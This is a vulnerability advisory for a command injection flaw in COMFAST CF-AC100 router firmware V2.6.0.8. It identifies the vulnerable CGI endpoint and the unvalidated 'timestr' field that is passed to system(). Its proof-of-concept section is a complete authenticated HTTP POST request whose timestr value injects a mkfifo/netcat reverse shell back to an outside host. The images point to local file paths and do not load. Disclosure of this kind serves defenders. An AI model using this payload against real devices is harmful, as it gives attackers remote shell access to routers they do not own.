## Comfast CF-AC100

- **Supplier:** COMFAST

- **Product:** CF-AC100

- **Firmware Version:** V2.6.0.8

- **Vulnerability:** Command Injection

### 概述

A command injection vulnerability has been discovered in COMFAST CF-AC100 V2.6.0.8. Attackers can exploit this vulnerability to execute arbitrary commands by sending malicious HTTP POST packets. The vulnerability is triggered when the request path is `/cgi-bin/mbox-config?method=SET&section=ntp_timezone`, requiring the user to log in and obtain cookies.

### 漏洞详情

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)

The trigger point is located in the `sub_41DBC0` method of the `webmggnt` component. Here, the `timestr` field is not validated and is concatenated using `sprintf`, and then executed using `system`.

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-31-38-da39653a-f654-4732-abbf-16b689687634.png)

### 概念验证

```http
POST /cgi-bin/mbox-config?method=SET&section=ntp_timezone HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: appliation/json
X-Requested-With: XMLHttpRequest
Content-Length: 221
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/index.html
Cookie: language=sc; COMFAST_SESSIONID=0200a8c0-4261ffffffc85cffffff8a5f-6b8b4567

{"timestr":"2021-10-10 10:10:10\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 9999 >/tmp/f; #","timezone":"UTC-8","zonename":"63","ntp_client_enabled":"0","ntp_servername":"0.openwrt.pool.ntp.org"}
```

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-32-47-bd19518f-7a25-4f31-9b8c-c48987e9a24e.png)
